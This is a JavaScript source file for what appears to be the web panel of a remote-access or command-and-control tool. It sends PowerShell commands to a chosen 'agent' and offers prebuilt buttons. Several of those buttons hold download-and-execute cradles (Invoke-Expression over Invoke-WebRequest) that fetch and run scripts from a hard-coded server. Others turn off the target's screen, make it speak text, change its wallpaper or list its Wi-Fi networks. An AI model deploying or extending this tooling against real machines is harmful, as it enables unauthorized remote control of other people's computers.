const serverURL = "http://192.168.80.24:5000"

const getScript = (name, textToSay = "") => {
    // For the "Talk" script, append the dynamic text into the PowerShell script as a string argument
    if (name === 'talk.ps1' && textToSay) {
        return `Invoke-Expression ( [System.Text.Encoding]::UTF8.GetString((Invoke-WebRequest -Uri "${serverURL}/static/scripts/${name}").Content) ) "${textToSay}"`
    }
    return `Invoke-Expression ( [System.Text.Encoding]::UTF8.GetString((Invoke-WebRequest -Uri "${serverURL}/static/scripts/${name}").Content) )`
}

const scripts = [
    {
        name: 'Test Script',
        command: getScript('test.ps1')
    },
    {
        name: 'Wallpaper Script',
        command: getScript('wallpaper.ps1')
    },
    {
        name: 'Talk',
        command: getScript('talk.ps1', "Hello, I am a remote agent.")
    },
    {
        name: 'Monkey',
        command: getScript('monkey.ps1')
    },
    {
        name: 'Turn off screen',
        command: "(Add-Type '[DllImport(\"user32.dll\")]public static extern int SendMessage(int hWnd, int hMsg, int wParam, int lParam);' -Name a -Pas)::SendMessage(-1,0x0112,0xF170,2)"
    },
    {
        name: 'List Wi-Fi Networks',
        command: getScript('wifi.ps1')
    },
    {
        name: 'List Processes',
        command: "Get-Process | Select-Object Name, CPU, ID | Sort-Object CPU -Descending | Format-Table -AutoSize"
    },
    {
        name: 'Disk Space',
        command: "Get-PSDrive -PSProvider FileSystem | Select-Object Name, @{Name='Free(GB)'; Expression={[math]::Round($_.Free/1GB,2)}}, @{Name='Used(GB)'; Expression={[math]::Round($_.Used/1GB,2)}} | Format-Table -AutoSize"
    },
    {
        name: 'Public IP',
        command: "(Invoke-WebRequest -uri 'https://api.ipify.org?format=json').Content"
    },
    {
        name: 'Test Internet',
        command: getScript('test_internet.ps1')
    }
];

function toggleSection(sectionId, arrowId) {
    const section = document.getElementById(sectionId);
    const arrow = document.getElementById(arrowId);
    section.classList.toggle("hidden");
    arrow.style.transform = section.classList.contains("hidden")
        ? "rotate(0deg)"
        : "rotate(180deg)";
}

// Function to handle form submission
function submitCommandForm(event) {
    event.preventDefault(); // Prevent default form submission

    const commandInput = document.getElementById("commandInput");
    const agentIdInput = document.getElementById("agentId");
    const command = commandInput.value.trim();
    const agentId = agentIdInput.value;

    if (command) {
        fetch("/send_command", {
            method: "POST",
            headers: {
                "Content-Type": "application/json",
            },
            body: JSON.stringify({ agent_id: agentId, command: command }),
        })
            .then((response) => response.json())
            .then((data) => {
                if (data) {
                    // Handle success (show confirmation, clear form, etc.)
                    alert("Command sent successfully!");
                    commandInput.value = ""; // Clear the input field
                } else {
                    // Handle failure
                    alert("Failed to send command. Please try again.");
                }
            })
            .catch((error) => {
                alert("Error: " + error.message);
            });
    }
}

// Function to populate the command input field
function populateCommand(script) {
    const commandInput = document.getElementById("commandInput");
    commandInput.value = script;
}

// Function to dynamically create prebuilt script buttons
function createPrebuiltScriptButtons() {
    const prebuiltScriptsContainer = document.getElementById("prebuiltScripts");

    scripts.forEach((script) => {
        const button = document.createElement("button");
        button.textContent = script.name;
        button.className =
            "px-4 py-2 bg-blue-600 text-white rounded-lg hover:bg-blue-700 text-sm font-semibold";
        button.onclick = () => populateCommand(script.command);
        prebuiltScriptsContainer.appendChild(button);
    });
}

// Initialize prebuilt script buttons on page load
document.addEventListener("DOMContentLoaded", createPrebuiltScriptButtons);